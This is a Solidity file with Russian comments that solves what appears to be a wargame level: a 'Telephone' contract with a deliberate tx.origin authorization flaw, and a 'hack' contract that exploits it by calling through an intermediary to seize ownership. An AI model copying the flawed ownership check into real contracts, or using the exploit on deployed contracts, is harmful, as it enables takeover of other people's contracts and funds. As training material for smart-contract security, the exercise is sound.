// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;//изначально выставленный валделей
    }

    function changeOwner(address _owner) public {//функция смены владельца
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

//адрес заканчивающийся на С4 сначала вызвал hach, аон уже вызвал Telephone

contract hack{
    function hach(Telephone _tel) external  {
        _tel.changeOwner(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4); //можно указать любой адрес
    }
}


//Суть задачи, украсть владельца
